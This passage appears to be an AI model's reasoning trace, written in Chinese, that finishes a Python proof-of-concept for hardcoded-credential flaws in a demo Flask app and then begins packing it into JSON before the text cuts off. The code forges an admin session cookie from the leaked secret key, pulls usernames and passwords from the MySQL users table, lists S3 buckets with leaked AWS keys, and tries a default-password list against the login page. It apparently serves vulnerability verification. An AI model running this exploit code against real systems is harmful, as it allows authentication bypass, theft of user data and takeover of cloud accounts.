"""验证Flask硬编码密钥可被用于伪造会话，绕过认证"""\n    print("[*] 测试Flask密钥伪造会话...")\n    try:\n        # 用提取的secret_key初始化签名器，模拟Flask的session签名逻辑\n        serializer = URLSafeTimedSerializer(FLASK_SECRET_KEY)\n        # 伪造管理员会话数据\n        fake_session = {"user_id": 1, "role": "admin", "username": "admin"}\n        # 生成签名后的session令牌\n        fake_token = serializer.dumps(fake_session, salt="cookie-session")\n        print(f"[+] 成功伪造Flask会话令牌：{fake_token}")\n        print("[+] 可将该令牌注入Cookie访问/admin等需认证接口，绕过登录限制")\n        return True\n    except Exception as e:\n        print(f"[-] 伪造失败：{str(e)}")\n        return False\n\ndef test_db_conn():\n    """验证硬编码数据库密码可成功连接数据库"""\n    print("\\n[*] 测试数据库凭据有效性...")\n    try:\n        # 解析DATABASE_URL获取连接参数\n        db_params = DATABASE_URL.replace("mysql+pymysql://", "").split("@")\n        user_pwd = db_params[0].split(":")\n        user = user_pwd[0]\n        pwd = user_pwd[1]\n        host_port_db = db_params[1].split("/")\n        host = host_port_db[0].split(":")[0]\n        port = int(host_port_db[0].split(":")[1])\n        db_name = host_port_db[1]\n        # 尝试连接数据库\n        conn = pymysql.connect(host=host, port=port, user=user, password=pwd, database=db_name, connect_timeout=5)\n        cursor = conn.cursor()\n        cursor.execute("SELECT username, password FROM users LIMIT 5")\n        res = cursor.fetchall()\n        conn.close()\n        print(f"[+] 数据库连接成功，获取到用户数据样例：{res}")\n        print("[+] 可进一步查询/篡改所有用户敏感数据")\n        return True\n    except Exception as e:\n        print(f"[-] 数据库连接失败（可能是目标未启动）：{str(e)}")\n        return False\n\ndef test_aws_key():\n    """验证硬编码AWS密钥可调用AWS服务"""\n    print("\\n[*] 测试AWS密钥有效性...")\n    try:\n        # 用提取的密钥初始化S3客户端\n        s3 = boto3.client(\n            "s3",\n            aws_access_key_id=AWS_ACCESS_KEY_ID,\n            aws_secret_access_key=AWS_SECRET_ACCESS_KEY,\n            region_name="us-east-1"\n        )\n        # 调用ListBuckets接口验证密钥有效性\n        res = s3.list_buckets()\n        buckets = [bucket["Name"] for bucket in res["Buckets"]]\n        print(f"[+] AWS密钥有效，获取到存储桶列表：{buckets}")\n        print("[+] 可进一步操作存储桶内的敏感数据")\n        return True\n    except ClientError as e:\n        error_code = e.response["Error"]["Code"]\n        if error_code == "InvalidAccessKeyId":\n            print("[-] AWS密钥无效")\n        else:\n            print(f"[-] AWS调用失败：{str(e)}")\n        return False\n    except Exception as e:\n        print(f"[-] 测试失败：{str(e)}")\n        return False\n\ndef test_default_pwd_crack():\n    """验证硬编码默认密码列表可被用于撞库登录"""\n    print("\\n[*] 测试默认密码撞库...")\n    # 模拟登录接口地址（根据实际项目修改）\n    login_url = "http://localhost:5000/login"\n    # 模拟测试用户名（根据实际项目修改）\n    test_user = "alice"\n    for pwd in DEFAULT_PASSWORDS:\n        try:\n            # 构造登录请求\n            data = {"username": test_user, "password": pwd}\n            res = requests.post(login_url, data=data, timeout=5)\n            if "登录成功" in res.text or res.status_code == 302:\n                print(f"[+] 撞库成功，用户名：{test_user}，密码：{pwd}")\n                print("[+] 可登录用户账号获取敏感权限")\n                return True\n        except Exception as e:\n            print(f"[-] 请求登录接口失败（可能是目标未启动）：{str(e)}")\n            return False\n    print("[-] 默认密码均无法登录（可能是密码已修改）")\n    return False\n\nif __name__ == "__main__":\n    print("="*50 + " 硬编码密钥/口令漏洞验证 " + "="*50)\n    # 执行所有验证项\n    results = []\n    results.append(("Flask会话伪造", test_flask_secret_forge()))\n    results.append(("数据库凭据验证", test_db_conn()))\n    results.append(("AWS密钥验证", test_aws_key()))\n    results.append(("默认密码撞库", test_default_pwd_crack()))\n    # 输出汇总结果\n    print("\\n" + "="*50 + " 验证结果汇总 " + "="*50)\n    for name, res in results:\n        status = "成功" if res else "失败"\n        print(f"{name}：{status}")\n```\n然后把这些整理成JSON格式，注意转义引号，还有字符串里的换行要转义成\\n。\n等下，要注意JSON的格式正确，比如字符串里的双引号要转义，换行是\\n。还有verify_code里的代码要放在字符串里，注意转义。\n哦对，还有，比如config.py里的DATABASE_URL是mysql的，而app.py里用的是sqlite3，这个是演示项目的矛盾，没关系，因为是演示用的，PoC里可以说明。\n还有，比如app.py里的API_KEY是***，所以PoC里写的是示例值，注释说明就行。\n现在整理成正确的JSON：\n首先，reproduce_steps的内容要准确，然后verify_code的代码要正确，带注释。\n等下，还要注意，用户给的漏洞是硬编码密钥/口令，所以复现步骤要围绕提取硬编码凭据，然后验证这些凭据的可利用性。\n还有，比如还有硬编码的默认密码列表，所以撞库也是验证点。\n现在把JSON写出来，注意格式正确，不要有语法错误。\n哦对，JSON里的字符串如果有换行的话，要写成\\n，比如reproduce_steps里的步骤换行用\\n。\n还有verify_code里的代码，比如反引号？不，JSON里的字符串用双引号，所以代码里的双引号要转义成\\"，或者用单引号？不过Python里单引号也可以，不过最好转义。\n等下，比如verify_code里的代码字符串，比如：\n"verify_code": "```python\\n# -*- coding: utf-8 -*-\\n...\\n```"\n不过也可以不用markdown的代码块，直接放代码就行，不过加上也可以。\n现在整理成正确的JSON：\n{\n    "reproduce_steps": "1. 攻击者通过源码泄露场景（如.git目录未授权访问、/app.py路径直接可访问）获取项目完整源码；\\n2. 解析敏感文件app.py、config.py，提取所有硬编码凭据：Flask密钥`hardcoded-flask-secret-key-2024`（app.py:18）、数据库连接串`mysql+pymysql://root:admin123@localhost:3306/sample_db`（config.py:9）、AWS密钥对`AKIAIOSFODNN7EXAMPLE`/`wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`（config.py:12-13）、默认密码列表`[\\"admin\\", \\"admin123\\", \\"123456\\", \\"password\\", \\"qwerty\\"]`（config.py:25）、第三方API Key（app.py:20）；\\n3. 验证Flask密钥可利用性：使用提取的secret_key伪造Flask签名会话，将伪造的session令牌注入请求Cookie，访问需认证的/admin接口可绕过登录限制；\\n4. 验证数据库凭据可利用性：使用提取的DATABASE_URL连接目标数据库，成功登录后可查询users表获取所有用户的密码哈希、敏感信息；\\n5. 验证AWS密钥可利用性：使用提取的AWS密钥对调用AWS S3 ListBuckets接口，可获取目标AWS账户下的所有存储桶列表，进而访问存储桶内的敏感文件；\\n6. 验证默认密码可利用性：使用提取的默认密码列表对项目登录接口（/login）发起撞库请求，可登录使用弱密码的用户账号（如alice/password1），获取用户权限。",\n    "verify_code": "# -*- coding: utf-8 -*-\\n\\"\\"\\"\\n硬编码密钥/口令漏洞验证PoC\\n依赖安装：pip install flask itsdangerous pymysql boto3 requests\\n\\"\\"\\"\\nimport json\\nfrom itsdangerous import URLSafeTimedSerializer\\nimport pymysql\\nimport boto3\\nfrom botocore.exceptions import ClientError\\nimport requests\\n\\n# -------------------------- 1. 提取硬编码凭据（模拟从源码解析） --------------------------\\n# 从app.py:18提取的Flask密钥\\nFLASK_SECRET_KEY = \\"hardcoded-flask-secret-key-2024\\"\\n# 从config.py:9提取的数据库连接串\\nDATABASE_URL = \\"mysql+pymysql://root:admin123@localhost:3306/sample_db\\"\\n# 从config.py:12-13提取的AWS密钥对\\nAWS_ACCESS_KEY_ID = \\"AKIAIOSFODNN7EXAMPLE\\"\\nAWS_SECRET_ACCESS_KEY = \\"wJalrXUtnFEMI